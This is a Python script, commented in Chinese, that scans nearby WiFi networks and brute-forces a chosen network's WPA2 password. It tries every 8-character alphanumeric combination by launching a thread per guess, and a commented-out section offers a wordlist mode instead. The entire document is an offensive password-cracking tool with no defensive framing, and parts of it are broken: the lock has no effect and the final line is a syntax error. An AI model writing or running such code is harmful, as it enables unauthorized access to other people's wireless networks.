import os
from pywifi import PyWiFi, const, Profile
import time
import itertools as its
import threading

# 定义全局变量，用于控制线程停止
event = threading.Event()
path = os.path.dirname(__file__)
# 密码本路径
# file_path = path + ""

def check_wifi(iface):
    iface.scan()
    print("---扫描周围WiFi中---")
    time.sleep(1)
    for i in iface.scan_results():
        print("WiFi名称:" + i.ssid.encode("raw_unicode_escape").decode() + ",信号强度:", str(i.signal + 100) + "%")

def connect_wifi(iface, pwd, wifi_name):
    profile = Profile()
    profile.ssid = wifi_name.encode().decode("GBK")
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.auth = const.AUTH_ALG_OPEN
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = pwd
    iface.remove_all_network_profiles()
    test_profiles = iface.add_network_profile(profile)

    # 使用互斥锁进行连接尝试
    lock = threading.Lock()
    with lock:
        iface.connect(test_profiles)

    time.sleep(1)
    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

def password_cracker(iface, pwd, wifi_name):
    global event
    if not event.is_set():
        if connect_wifi(iface, pwd, wifi_name):
            print("破解成功，密码为:", pwd)
            tpwd = pwd
            event.set()  # 设置事件标志，通知其他线程停止
        else:
            print("密码："+pwd+",破解失败")
            return  # 尝试失败后直接退出线程

if __name__ == "__main__":
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    if iface.status() == const.IFACE_CONNECTED:
        print("请断开wifi，再尝试运行!")
    elif iface.status() == const.IFACE_DISCONNECTED:
        check_wifi(iface)
        wifi_name = input("请输入想破解wifi名称:")
        print("---开始破解---")
        #密码本方式遍历
        # with open(file_path,"r") as f:
        #     while True:
        #         pwd=f.readline().strip("\n")
        #         if not pwd:
        #             break
        #         elif connect_wifi(iface,pwd,wifi_name):
        #             print("破解成功，密码为:",pwd)
        #             input("按任意键退出!")
        #             break
        #         else:
        #             print("破解失败")
        words = '0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'  # 大小写字母 + 数字 组合
        # 生成密码的位数为8
        r = its.product(words, repeat=8)

        threads = []
        for i in r:
            pwd = ''.join(i)
            thread = threading.Thread(target=password_cracker, args=(iface, pwd, wifi_name))
            thread.start()
            threads.append(thread)

        # 等待所有线程完成
        for thread in threads:
            thread.join()
    else:
        print("当前网卡状态异常!!!\n请重新运行")
        time. Sleep(1)